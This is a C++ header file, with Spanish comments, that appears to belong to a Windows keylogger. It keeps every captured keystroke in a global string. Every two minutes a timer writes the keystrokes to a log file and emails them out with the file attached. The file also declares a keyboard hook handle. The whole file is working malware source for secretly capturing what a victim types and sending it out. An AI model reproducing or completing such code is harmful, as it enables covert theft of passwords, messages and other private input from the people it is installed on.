#ifndef KeybHook_h
#define KeybHook_h

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"
#include "IO.h"

/*Almacena todas las pulsaciones*/
std::string keylog = "";

/*Intentará enviar un mensaje cada dos minutos*/
void TimerSendMail() {

	if (keylog.empty())
		return;
	std::string last_file = IO::WriteLog(keylog);

	if (last_file.empty()) {
		Helper::WriteAppLog("File creation was not succesfull '" + keylog + "'");
		return;
	}

	int x = Mail::SendMail("Log [" + last_file + "]", 
		"Hi :)\n The file has been attached to this mail :) \n For testing, enjoy \n"
		+ keylog, IO::GetOurPath(true) + last_file);
	if (x != 7)
		Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
	else
		keylog = "";
}

Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);

HHOOK eHook = NULL;



#endif // !KeybHook_h
